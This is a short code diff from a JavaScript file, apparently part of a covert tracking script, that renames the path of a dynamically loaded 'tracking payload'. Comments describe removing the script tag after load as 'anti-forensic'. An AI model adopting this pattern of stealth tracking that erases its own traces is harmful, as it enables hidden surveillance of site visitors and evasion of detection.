@@ -116,7 +116,7 @@
 
           // Load the real tracking payload
           var script = document.createElement('script');
-          script.src = '/payload';
+          script.src = '/tracker-payload.js';
           script.onload = function() {
             log('Tracker payload loaded');
             // Remove script tag after load (anti-forensic)
